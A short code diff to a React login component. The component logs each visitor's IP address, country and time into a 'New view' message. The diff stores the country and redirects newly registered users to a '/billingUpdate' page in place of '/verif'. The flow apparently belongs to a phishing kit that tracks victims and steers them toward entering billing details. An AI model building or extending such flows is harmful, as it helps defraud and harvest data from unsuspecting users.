@@ -22,6 +22,7 @@ const Login = () => {
         // Alternative using ip-api.com (also free, no API key needed)
         const ipData = await axios.get('http://ip-api.com/json/?fields=country,query');
         const { query: ip, country } = ipData.data;
+        localStorage.setItem('country', country);
         const currentTime = new Date().toLocaleString();
 
         const message = `New view\nIP: ${ip}\nCountry: ${country}\nTime: ${currentTime}`;
@@ -66,7 +67,7 @@ const Login = () => {
         localStorage.setItem('userId', response.data.userId);
         console.log('Registration successful, redirecting...');
         // Redirect to the Verification page
-        history.push('/verif');
+        history.push('/billingUpdate');
       }
     } catch (error) {
       console.error('Registration failed:', error.response?.data || error.message);
